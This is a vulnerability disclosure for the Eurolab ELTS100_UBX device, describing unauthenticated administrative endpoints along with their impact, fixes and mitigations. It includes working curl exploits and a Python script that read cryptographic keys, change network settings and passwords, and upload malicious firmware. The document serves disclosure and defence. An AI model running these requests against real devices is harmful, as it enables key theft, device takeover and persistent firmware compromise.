# Eurolab ELTS100_UBX Broken Access Control Vulnerability

## Description
The **Eurolab ELTS100_UBX** device (firmware version **ELTS100v1.UBX**) is vulnerable to **Broken Access Control** due to missing authentication on critical administrative endpoints. Attackers can directly access and modify sensitive system and network configurations, upload firmware, and execute unauthorized actions without any form of authentication. This vulnerability allows remote attackers to fully compromise the device, control its functionality, and disrupt its operation.

---

## Vendor Information
- **Vendor:** Eurolab s.r.l  
- **Vendor Homepage:** [http://eurolab-srl.com/](http://eurolab-srl.com/)

---

## Affected Products
- **Product:** Eurolab ELTS100_UBX  
- **Hardware Version:** E118  
- **Firmware Version:** ELTS100v1.UBX  

---

## Vulnerable Endpoints
- `/crypto/keypage.htm`  
- `/crypto/savefile.cgi`  
- `/system_setup.htm`  
- `/protect/config.htm`  
- `/firmware/now_upgrade.htm`  
- `/bootloader`  
- `/mpfsupload`  

---

## Attack Type
- **Type:** Broken Access Control  
- **Classification:** Improper Authorization  

---

## Impact
**Severity:** High  

### Description:
The Eurolab ELTS100_UBX device is vulnerable to Broken Access Control due to the absence of authentication checks on critical endpoints. Attackers can:  
- View and modify cryptographic keys  
- Change system settings  
- Modify network configuration  
- Upload new firmware  
- Access bootloader  

### Affected Components:
- **Access Control:** Direct access to sensitive administrative endpoints without authentication  
- **Configuration Settings:** Network and system settings are modifiable without authentication  
- **Firmware Update:** Unauthorized firmware uploads enable persistent compromise  

---

## Attack Vector
- **Access Method:** Remote, over HTTP  
- **Authentication Requirement:** None (unauthenticated)  
- **Exploit Complexity:** Low (simple HTTP requests)  

---

## Proof of Concept (PoC)

### 1. **Exploit: Access Cryptographic Keys**
An attacker can access sensitive cryptographic keys using the following unauthenticated `GET` request:

```bash
curl '{target}/crypto/keypage.htm'
```
Or:

```bash
curl '{target}/crypto/savefile.cgi'
```

### 2. **Exploit: Modify System Settings**

Attackers can modify system settings without authentication using the following POST request:

```bash
curl '{target}/system_setup.htm' -X POST --data-raw 'Loc=Druento+%28TOshiky%29&Tizo=2&Leti=1&Gnss=0'
```

#### Example response:

```
HTTP/1.1 200 OK  
Settings updated successfully!
```

### 3. **Exploit: Modify TCP/IP Configuration**

Attackers can modify network configuration (e.g., hostname, IP address, DNS settings, password) using:

```bash
curl '{target}/protect/config.htm' -X POST --data-raw 'host=ELTS100&ip=192.168.10.30&gw=192.168.10.254&sub=255.255.255.0&dns1=8.8.8.8&npw=New_password&cnpw=New_password&encp=1'
```

#### Example response:

```
HTTP/1.1 200 OK  
Configuration updated successfully!
```

### 4. **Exploit: Upload and Install Firmware**

Attackers can upload and install new firmware without authentication:


```bash
curl '{target}/firmware/now_upgrade.htm' -F 'firmware=@malicious_firmware.bin'
```

Or access the bootloader directly:

```bash
curl '{target}/bootloader'
```

Or upload mpf files using:

```bash
curl '{target}/mpfsupload' -F 'file=@malicious_file.bin'
```

---

## **Automated Exploit (Python PoC Script)**

The following Python script automates the attack process:

```python
import requests

target = "http://target"

def get_keys():
    response = requests.get(f"{target}/crypto/keypage.htm")
    print(response.text)

def modify_system():
    data = {'Loc': 'Druento (TOshiky)', 'Tizo': 2, 'Leti': 1, 'Gnss': 0}
    response = requests.post(f"{target}/system_setup.htm", data=data)
    print(response.text)

def modify_network():
    data = {
        'host': 'ELTS100',
        'ip': '192.168.10.30',
        'gw': '192.168.10.254',
        'sub': '255.255.255.0',
        'dns1': '8.8.8.8',
        'npw': 'New_password',
        'cnpw': 'New_password',
        'encp': 1
    }
    response = requests.post(f"{target}/protect/config.htm", data=data)
    print(response.text)

def upload_firmware():
    files = {'firmware': open('malicious_firmware.bin', 'rb')}
    response = requests.post(f"{target}/firmware/now_upgrade.htm", files=files)
    print(response.text)

if __name__ == "__main__":
    print("[+] Accessing Crypto Keys...")
    get_keys()
    print("[+] Modifying System Settings...")
    modify_system()
    print("[+] Modifying Network Config...")
    modify_network()
    print("[+] Uploading Malicious Firmware...")
    upload_firmware()
```

---

## **PoC Video**  
https://github.com/user-attachments/assets/48b05a50-1ae4-4616-9ead-09ca4f1433db

---

## Vulnerability Type Info

### Vulnerability Type
- **Broken Access Control**

### CWE-ID
- **CWE-284** – Improper Access Control  
- **CWE-285** – Improper Authorization  

---

## Impact Info

### Impact Type
- **Privilege Escalation:** Unauthenticated attackers can gain administrative access.  
- **Configuration Modification:** Attackers can modify device settings, including network configuration.  
- **Firmware Injection:** Attackers can upload malicious firmware.  
- **System Compromise:** Attackers can take full control of the device.  

---

## Suggested Fixes

### Authentication
- Implement mandatory authentication for all sensitive endpoints.

### Access Control
- Restrict administrative endpoints to trusted IP addresses only.  
- Enforce role-based access control (RBAC).  

### Input Validation
- Validate all inputs, including POST and GET parameters.  

### Firmware Security
- Require cryptographic signature verification before allowing firmware updates.  

### Session Management
- Ensure secure session handling and prevent session fixation attacks.  

---

## Mitigation & Workarounds

Until a patch is released, administrators should:  
- Restrict access to sensitive endpoints using firewall rules.  
- Monitor network traffic for suspicious activity.  
- Disable firmware update access from untrusted sources.  
- Require VPN or secure tunnel for remote administrative access.  
